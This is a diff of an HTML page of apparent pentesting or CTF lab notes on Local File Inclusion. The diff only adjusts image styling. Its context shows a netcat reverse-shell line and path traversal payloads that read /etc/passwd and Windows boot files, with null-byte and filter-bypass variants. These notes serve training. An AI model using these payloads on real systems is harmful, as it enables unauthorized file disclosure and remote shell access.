@@ -159,16 +159,15 @@ nc -e /bin/sh 10.20.14 8080<br>
 <br><br>
     <h2><li>Local File Inclusion (LFI) exploitation</li></h2>
     <p>Execute command in quary string</p>
-    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png">
+    <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/dc22709e572d5de31ed4effb2ebc161f.png" style="width:1100.25px;height:513.67px">
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3037513935e3242f74bd0fe97833b5ac.png"><br>
      <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/c12d34456ebe25bafffeb829c58f98c0.png" style="font-size:1rem;width:1000.25px;height:513.67px">
-
      <br>if the web application runs on a Windows server, the attacker needs to provide Windows paths. For example, if the attacker wants to read the boot.ini file located in c:\boot.ini, then the attacker can try the following depending on the target OS version:<br>
      <b>http://webapp.thm/get.php?file=../../../../boot.ini</b> or <b>http://webapp.thm/get.php?file=../../../../windows/win.ini</b>
      <br><br>
      <p>if <b>/etc/passwd</b> not work then try, <b>../../../../etc/passwd</b>. If it also didnot work then try, <b>with NULLBYTE(%00, 0x00) at the end of the payload.<br> example: http://webapp.thm/index.php?lang=/etc/passwd%00 or http://webapp.thm/index.php?lang=../../../../etc/passwd%00</b></p>
      <p> If none of them work then try <b>/etc/passwd/.</b> <br> if all of them are failed then oviously try this one - <b>....//....//....//....//....//etc/passwd</b></p>
-     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png" alt="">
+     <img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/30d3bf0341ba99485c5f683a416a056d.png" style="font-size:1rem;width:500.25px;height:200px">
      <h4>Tips: some time it only work on url. it also some time word on specified folder. find it and execute payload there.</h4>
     </div>
    <!-- Exploitation section end here    -->
